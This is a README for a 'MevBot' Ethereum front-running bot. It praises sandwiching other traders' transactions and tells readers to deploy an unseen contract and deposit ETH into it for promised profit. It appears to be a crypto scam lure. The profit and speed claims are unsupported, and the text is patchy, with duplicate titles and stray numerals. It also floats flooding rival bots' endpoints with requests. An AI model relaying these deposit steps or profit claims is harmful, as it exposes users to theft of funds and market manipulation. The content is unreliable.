# MevBot
Make money with MEV-bot (GPT-4 source code) (audit contract)
The code was never meant to be shown to anybody. My commercial code is better and this was intended to be "tested in production" and a ton of quality tradeoffs have been made. Never ever did I plan to release this publicly, lest I "leak my alpha". But nonetheless I would like to show off what I've learned in the past years.

Bot sends the Transaction and sniffs the Uniswap v2 Mempool

Bots then compete to buy up the token onchain as quickly as possible, sandwiching the victims transaction and creating a profitable slippage opportunity

Sending back the ETH to the contract ready for withdrawal.

This bot performs all of that, faster than 99% of other bots.

But ser, there are open source bots that do the same

Yes, there indeed are. Mine was first, tho. And I still outperform them. Reading their articles makes me giggle, as i went through their same pains and from a bot builder to a bot builder, i feel these guys. <3

Wen increase aggressiveness ?

As i've spent a year obsessing about this, i have a list of target endpoints that I know other bots use, which i could flood with requests in order to make them lose up to 5 seconds of reaction time and gain an edge over them.

Personal journey in this

What did I learn?

MEV, Frontrunning, EIP-1559, "The Dark Forest", all sorts of tricks to exploit more web2 kind of architectures. And all sorts of ins and outs aboout Unsiwap

So why stop?

I've made some profits from this but now using some other better commercial methods, ready to share what I have learnt so devs don't need to go through the same pain.

Towards the end I kept getting outcompeted by this individual:

https://etherscan.io/address/0x55659ddee6cb013c35301f6f3cc8482de857ea8e

If this is you, I'd like to congratulate you on your badassery. I have been following your every trade for months, and have not been able to figure out how you get ±20 secs earlier than I do. What a fucking chad.

But I will give you some competition.(ㆆ_ㆆ)

MEV bot Instructions

(works only for Mainnet)

Access the ChainIDE Compiler and click on the big Ethereum Logo: https://chainide.com/

With the login button Select "Injected Web 3" and connect your Metamask or wallet with ChainIDE

On the left create a New File. Rename it as you like, i.e: “MevBot.sol"

Mev-Bot
Make money with MevBot (ETH network)

How it works:

create-a-frontrunner-bot-on-uniswap

You can see an example of how the bot works.

The bot will make transactions on your entire balance to increase profit

First-source code

Copy code and paste in Remix IDE

1

Click Solidity complier 0.6.6

And press Compile Mev Bot.sol

2

Select ETH or BSC(BNB) network

and router address

Press Transact (Deploy)

3

Next-deposit (balans Mev Bot)

Copy contract your MevBot and send a number of Ethereum to the bot's balance for the bot to work. And start it with the start button

4

4 1

5

Wait a couple of days for a profit. For successful transactions on the Ethereum network, you must have enough balance to cover the gas. Recommended 0.2-1

At any time you can Stop bot or return your money by calling the withdrawal function.
